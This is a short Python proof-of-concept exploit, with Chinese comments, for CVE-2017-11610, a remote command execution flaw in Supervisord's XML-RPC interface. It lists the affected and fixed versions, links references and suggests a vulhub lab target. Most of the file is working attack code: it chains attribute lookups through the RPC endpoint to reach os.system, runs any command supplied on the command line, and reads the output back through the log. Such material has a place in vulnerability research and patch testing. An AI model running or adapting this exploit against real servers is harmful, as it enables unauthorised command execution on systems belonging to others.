# coding=utf-8
"""
DATE:   2020/11/4
AUTHOR: Yanxi Li
"""

'''
Supervisord 远程命令执行漏洞（CVE-2017-11610）

影响版本：Supervisor 3.1.2 <= Version <= 3.3.2

已修复版本：Supervisor 3.3.3、Supervisor 3.2.4、Superivsor 3.1.4、Supervisor 3.0.1

ref:
https://github.com/phith0n/vulhub/tree/master/supervisor/CVE-2017-11610
https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html

最好用vulhub的靶机环境复现

usage:
python3 supervisord_poc.py "http://10.0.4.149:9001/RPC2" "pwd"
'''

import xmlrpc.client
import sys

target = sys.argv[1]
command = sys.argv[2]
with xmlrpc.client.ServerProxy(target) as proxy:
    old = getattr(proxy, 'supervisor.readLog')(0, 0)

    logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
    getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')(
        '{} | tee -a {}'.format(command, logfile))
    result = getattr(proxy, 'supervisor.readLog')(0, 0)

    print(result[len(old):])
